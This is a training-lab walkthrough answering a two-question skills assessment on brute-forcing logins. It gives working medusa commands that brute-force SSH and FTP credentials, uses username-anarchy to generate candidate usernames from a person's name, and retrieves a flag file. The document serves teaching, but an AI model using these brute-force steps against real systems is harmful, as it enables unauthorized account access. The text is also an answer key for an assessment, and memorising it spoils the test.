# Skills Assessment Part 2

### What is the username of the ftp user you find via brute-forcing?

For this Skills Assessment it is required that you completed successfully the [Skills Assessment Part 1](skills-assessment-part-1.md). We have to use the user founded previously and brute-force the credentials with the ssh module.

**Step 1** - Brute-force the new target with the new user:

* {% code overflow="wrap" %}
  ```bash
  medusa -h <SERVER_IP> -n <SERVER_PORT> -u <USER> -P 2023-200_most_used_passwords.txt -M ssh -t 3
  ```
  {% endcode %}
*

    <figure><img src="../../../.gitbook/assets/image (183).png" alt=""><figcaption></figcaption></figure>

**Step 2** - Login into the new target:

* {% code overflow="wrap" %}
  ```bash
  ssh <USER>@<SERVER_IP> -p <SERVER_PORT>
  ```
  {% endcode %}
* After login to the machine, lets make sure the ftp service is running with a simple `nmap localhost` command:

<figure><img src="../../../.gitbook/assets/image (185).png" alt=""><figcaption></figcaption></figure>

**Step 3** - Explore the target machine:

* It looks like the FTP server was already compromise. By checking the IncidentReport.txt we get some interesting information:
*

    <figure><img src="../../../.gitbook/assets/image (186).png" alt=""><figcaption></figcaption></figure>
* The user Thomas Smith was responsible for uploading files to the server. Our task is to find ftp user, and we can use the `username-anarchy` tool to generate usernames by combining the Thomas Smith name.

**Step 4** - Find the user and password to the ftp server:&#x20;

* Move to the `username-anarchy` folder and generate usernames for Thomas Smith:
  * {% code overflow="wrap" %}
    ```bash
    ./username-anarchy Thomas Smith > thomas_smith_usernames.txt
    ```
    {% endcode %}
* Brute-force the ftp authentication with medusa (we have a passwords.txt in the main directory):
  * {% code overflow="wrap" %}
    ```bash
    medusa -h 127.0.0.1 -U username-anarchy/thomas_smith_usernames.txt -P passwords.txt -M ftp -t 5
    ```
    {% endcode %}
* User and password found!

<figure><img src="../../../.gitbook/assets/image (191).png" alt=""><figcaption></figcaption></figure>

### What is the flag contained within flag.txt

**Step 1** - Connect to the ftp server:

* {% code overflow="wrap" %}
  ```bash
  ftp 'ftp://<USER>:<PASSWORD>@localhost'
  ```
  {% endcode %}

**Step 3** - Retreive the flag:

* Upon having logged in into the ftp service. You will easily find the flag with the `ls` command, then just download it with get `flag.txt`.

<figure><img src="../../../.gitbook/assets/image (192).png" alt=""><figcaption></figcaption></figure>

And we are done! Very fun section with good and practical examples that show us how to use brute-force tools.
